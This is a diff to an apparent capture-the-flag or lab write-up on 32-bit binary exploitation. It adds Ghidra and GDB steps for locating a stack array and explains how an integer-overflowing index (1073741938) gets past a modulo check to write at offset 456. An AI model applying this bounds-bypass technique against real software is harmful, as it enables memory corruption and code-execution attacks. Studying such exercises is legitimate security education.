@@ -213,7 +213,14 @@ Saved registers:
  eip at 0xffffcf2c
 ```
 
-Find data array start (0x1bc = 444 bytes):
+**Find where the data array starts:**
+
+In Ghidra, look at `main()`'s local variables:
+```c
+undefined4 local_1bc [100];  // The data array at EBP - 0x1bc
+```
+
+Calculate the address in GDB (0x1bc = 444 bytes):
 ```bash
 (gdb) p/x $ebp - 0x1bc
 $1 = 0xffffcd6c
@@ -235,18 +242,21 @@ We need an index where:
 **Solution:**
 ```
 Target offset: 456 bytes
-We need: (index × 4) ≡ 456 (mod 2^32)
+We need: (index × 4) to wrap around to 456 in 32-bit arithmetic
 
-One solution:
+How it works:
+  In 32-bit systems, numbers wrap at 2^32 (4,294,967,296)
+  
   index = (2^32 + 456) / 4
-  index = 4294967752 / 4
-  index = 1073741938
+  index = 4,294,967,752 / 4
+  index = 1,073,741,938
 
 Verification:
-  1073741938 × 4 = 4294967752
-  4294967752 mod 2^32 = 456 ✅
+  1,073,741,938 × 4 = 4,294,967,752
+  4,294,967,752 exceeds 2^32, so it wraps:
+  4,294,967,752 - 4,294,967,296 = 456 ✅
   456 / 4 = 114 (our target) ✅
-  1073741938 % 3 = 1 (bypasses check!) ✅
+  1,073,741,938 % 3 = 1 (bypasses check!) ✅
 ```
 
 **Magic index: 1073741938**
